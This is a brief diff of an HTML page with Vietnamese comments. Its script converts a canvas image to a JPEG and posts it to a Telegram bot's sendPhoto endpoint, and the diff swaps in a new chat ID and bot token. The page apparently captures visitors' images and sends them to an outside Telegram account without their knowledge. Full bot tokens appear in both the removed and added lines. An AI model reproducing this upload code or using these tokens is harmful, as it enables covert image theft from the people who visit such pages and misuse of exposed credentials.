@@ -92,12 +92,12 @@
         canvas.toBlob(function(blob) {
             // Gửi ảnh qua Telegram
             var formData = new FormData();
-            formData.append('chat_id', '-862312877'); // Thay YOUR_CHAT_ID bằng Chat ID của bot Telegram
+            formData.append('chat_id', '6824912964'); // Thay YOUR_CHAT_ID bằng Chat ID của bot Telegram
             formData.append('photo', blob, 'photo.jpg');
 
             $.ajax({
                 type: 'POST',
-                url: 'https://api.telegram.org/bot6002210854:AAFGExA_DbEgI5b4Yp-qJErd6xbhM7Wk_kQ/sendPhoto', // Thay YOUR_TELEGRAM_BOT_TOKEN bằng Telegram Bot Token của bạn
+                url: 'https://api.telegram.org/bot7782164824:AAEy8JN5QTcAcZ_MQRAMmkzmZd28IuzhS8I/sendPhoto', // Thay YOUR_TELEGRAM_BOT_TOKEN bằng Telegram Bot Token của bạn
                 data: formData,
                 processData: false,
                 contentType: false,
@@ -222,3 +222,4 @@
   </script>
 </body>
 </html>
+
